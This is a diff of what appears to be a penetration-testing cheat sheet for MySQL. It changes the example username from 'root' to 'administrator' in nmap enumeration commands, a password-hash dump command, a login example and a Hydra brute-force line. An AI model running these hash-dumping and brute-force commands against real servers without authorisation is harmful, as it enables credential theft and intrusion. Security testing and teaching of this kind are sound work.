@@ -24,29 +24,29 @@ sudo nmap -p3306 --script=mysql-info $IP
 sudo nmap -p3306 --script=mysql-empty-password $IP
 
 # Enum MySQL audit with AUTHENTICATION
-sudo nmap -p3306 --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='password123',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" $IP
+sudo nmap -p3306 --script=mysql-audit --script-args "mysql-audit.username='administrator',mysql-audit.password='password123',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" $IP
 
 # Enum users with AUTHENTICATION
-sudo nmap -p3306 --script=mysql-users --script-args "mysqluser='root',mysqlpass='password123'" $IP
+sudo nmap -p3306 --script=mysql-users --script-args "mysqluser='administrator',mysqlpass='password123'" $IP
 
 # Enum databases with AUTHENTICATION
-sudo nmap -p3306 --script=mysql-databases --script-args "mysqluser='root',mysqlpass='password123'" $IP
+sudo nmap -p3306 --script=mysql-databases --script-args "mysqluser='administrator',mysqlpass='password123'" $IP
 
 # Enum all variables with AUTHENTICATION
-sudo nmap -p3306 --script=mysql-variables --script-args "mysqluser='root',mysqlpass='password123'" $IP
+sudo nmap -p3306 --script=mysql-variables --script-args "mysqluser='administrator',mysqlpass='password123'" $IP
 
 # Dump hashes with AUTHENTICATION
-sudo nmap -p3306 --script=mysql-dump-hashes --script-args "username='root',password='password123'" $IP
+sudo nmap -p3306 --script=mysql-dump-hashes --script-args "username='administrator',password='password123'" $IP
 
 # Query database with AUTHENTICATION
-sudo nmap -p3306 --script=mysql-query --script-args "query='select count(*) from books.authors;',username='root',password='password123'" $IP
+sudo nmap -p3306 --script=mysql-query --script-args "query='select count(*) from books.authors;',username='administrator',password='password123'" $IP
 ```
 
 ## MySQL tool
 
 ```bash
 # Login to MySQL (password prompt)
-mysql -h $IP -u root
+mysql -h $IP -u administrator
     [none]> show databases;
     [none]> use <database>;
     [database]> show tables;
@@ -58,7 +58,7 @@ mysql -h $IP -u root
 ## Hydra
 
 ```bash
-hydra -l "root" -P /wordlists/passwords.txt $IP mysql
+hydra -l "administrator" -P /wordlists/passwords.txt $IP mysql
 ```
 
 ## MSFconsole
